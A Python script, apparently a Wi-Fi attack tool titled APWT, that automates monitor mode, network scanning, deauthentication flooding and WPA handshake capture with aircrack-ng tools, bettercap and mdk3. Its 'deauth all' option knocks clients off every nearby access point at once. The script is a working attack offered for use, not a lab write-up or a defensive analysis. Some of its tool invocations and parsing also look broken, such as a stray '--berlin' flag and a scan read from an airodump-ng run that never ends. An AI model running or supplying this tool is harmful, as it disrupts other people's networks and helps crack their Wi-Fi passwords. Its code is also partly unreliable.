import os
import subprocess
import time
import re

# Function to clear the terminal screen
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# Function to print the welcome banner
def print_welcome():
    print("\033[1;37;40m")  # Set text color to white on black
    print("    █████╗ ██████╗ ██╗    ██╗████████╗")
    print("   ██╔══██╗██╔══██╗██║    ██║╚══██╔══╝")
    print("   ███████║██████╔╝██║ █╗ ██║   ██║   ")
    print("   ██╔══██║██╔═══╝ ██║███╗██║   ██║   ")
    print("   ██║  ██║██║     ╚███╔███╔╝   ██║   ")
    print("   ╚═╝  ╚═╝╚═╝      ╚══╝╚══╝    ╚═╝   ")
    print("            Created by Shaz Husain")
    print("\033[0m")  # Reset to default color
    time.sleep(2)

# Function to get the Wi-Fi interface
def get_wifi_interface():
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    interfaces = re.findall(r'^(\w+)', result.stdout, re.MULTILINE)
    for interface in interfaces:
        if "IEEE 802.11" in subprocess.run(['iwconfig', interface], capture_output=True, text=True).stdout:
            return interface
    return None

# Function to set the Wi-Fi interface to monitor mode
def set_monitor_mode(interface):
    subprocess.run(['sudo', 'airmon-ng', 'start', interface])
    monitor_interface = interface + 'mon'
    return monitor_interface

# Function to scan for nearby Wi-Fi networks
def scan_networks(interface):
    print("\nScanning for nearby Wi-Fi networks...")
    command = ['sudo', 'airodump-ng', interface, '--write', 'handshake', '--output-format', 'cap', '--berlin', '0']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(25)  # Scanning duration
    process.terminate()
    return 'handshake-01.cap'

# Function to parse and display access points
def display_access_points(interface):
    scan_output = subprocess.run(['sudo', 'airodump-ng', interface], capture_output=True, text=True)
    ap_list = {}
    lines = scan_output.stdout.splitlines()
    
    print("\nAvailable Access Points:\n")
    for line in lines:
        if 'ESSID' in line:  # Skip the header line for AP info
            continue
        # Extract BSSID, Channel, and ESSID
        match = re.search(r'([0-9A-Fa-f:]{17})\s+(\d+)\s+.+\s+\d+\s+\d+\s+\d+\s+\d+\s+(\S+)', line)
        if match:
            bssid = match.group(1)
            channel = match.group(2)
            essid = match.group(3).strip().strip('"')
            ap_list[len(ap_list) + 1] = (bssid, channel, essid)
            print(f"{len(ap_list)}: BSSID: {bssid}, Channel: {channel}, ESSID: {essid}")

    return ap_list

# Function to deauthenticate clients
def deauthenticate_clients(bssid, method, interface):
    if method == '1':
        command = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', bssid, interface]
    elif method == '2':
        command = ['sudo', 'bettercap', '-I', interface, '-T', bssid, '--deauth']
    elif method == '3':
        command = ['sudo', 'mdk3', interface, 'd', '-a', bssid]
    
    subprocess.Popen(command)

# Main function
def main():
    clear_screen()
    print_welcome()
    
    interface = get_wifi_interface()
    if not interface:
        print("No compatible Wi-Fi interface found. Exiting...")
        return

    monitor_interface = set_monitor_mode(interface)
    handshake_file = scan_networks(monitor_interface)
    
    access_points = display_access_points(monitor_interface)

    # User selects an access point
    selected_ap = int(input("\nSelect an Access Point by number (or 0 to deauth all): "))
    if selected_ap == 0:
        # Deauth all clients from all APs
        for ap in access_points.values():
            deauthenticate_clients(ap[0], '1', monitor_interface)  # Defaulting to aireplay-ng for all
        print("Deauthenticating all clients from all access points.")
    elif selected_ap in access_points:
        bssid, channel, essid = access_points[selected_ap]
        
        print(f"\nSelected AP: {essid} ({bssid}), Channel: {channel}")
        
        # Ask for deauthentication method
        print("\nSelect a deauthentication method:")
        print("1: aireplay-ng")
        print("2: bettercap")
        print("3: mdk3")
        method = input("Enter method number: ")

        # Deauthenticate clients from the selected AP
        deauthenticate_clients(bssid, method, monitor_interface)

        # Start capturing the handshake
        print(f"\nCapturing handshake for {essid} ({bssid})...")
        time.sleep(5)  # Wait a moment before starting airodump-ng
        command = ['sudo', 'airodump-ng', '--bssid', bssid, '--channel', channel, '--write', 'handshake', monitor_interface]
        subprocess.Popen(command)

    print("Process completed.")

if __name__ == "__main__":
    main()
